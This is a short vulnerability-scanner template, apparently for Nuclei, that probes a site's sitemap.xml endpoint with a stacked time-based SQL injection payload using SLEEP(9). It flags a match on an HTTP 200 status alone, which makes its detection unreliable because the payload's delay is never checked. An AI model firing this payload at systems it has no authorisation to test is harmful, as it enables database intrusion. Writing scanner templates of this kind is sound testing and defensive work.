id: sql-injection
info:
  name: SQL Injection
  author: Aravind
  severity: high
  tags: [web, injection, sql]
requests:
  - method: GET
    path:
      - "{{BaseURL}}/sitemap.xml?offset=1;SELECT IF((SLEEP(9)),1,2356)#"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
